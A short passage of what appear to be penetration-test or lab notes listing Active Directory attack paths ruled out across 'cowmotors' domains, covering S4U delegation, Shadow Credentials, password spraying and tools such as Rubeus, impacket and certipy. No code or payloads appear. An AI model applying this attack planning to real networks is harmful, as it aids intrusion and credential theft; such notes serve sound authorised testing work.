- **Direct S4U from cowmotors.com to cowmotors-int.com** — no direct trust; would require going via cowmotors-lab.com and even then the constrained-delegation TargetName check applies domain-locally.
- **Shadow Creds without a CA** — no PKI object in BH (verify with `certipy find` first before ruling out).
- **Terence.Ford → WEB01 without Terence's creds** — no known path to Terence's creds unless spray hits.
- **impacket 0.13.0 S4U on Mac** — known-broken per notes; use Rubeus on-box.
